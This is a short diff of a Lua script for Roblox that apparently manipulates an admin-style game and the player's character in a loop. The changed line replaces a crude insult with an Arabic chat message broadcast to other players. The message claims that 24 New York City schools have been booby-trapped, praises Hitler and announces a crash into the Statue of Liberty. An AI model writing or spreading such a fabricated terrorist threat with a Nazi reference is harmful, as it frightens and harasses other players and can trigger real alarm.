@@ -7,7 +7,7 @@ end
 local part = workspace.Terrain._Game.Admin.Regen
 local looping = true
 local cf = lplr.Character.HumanoidRootPart
-chat("yor ba*l")
+chat("قمت بتفخيخ 24 مدرسة في مدينة نيويورك. خدمت هتلر 3 أبريل سأصطدم بتمثال الحرية.")
 coroutine.wrap(function()
 	while true do
 		lplr.Character:FindFirstChildOfClass("Humanoid"):ChangeState(11)
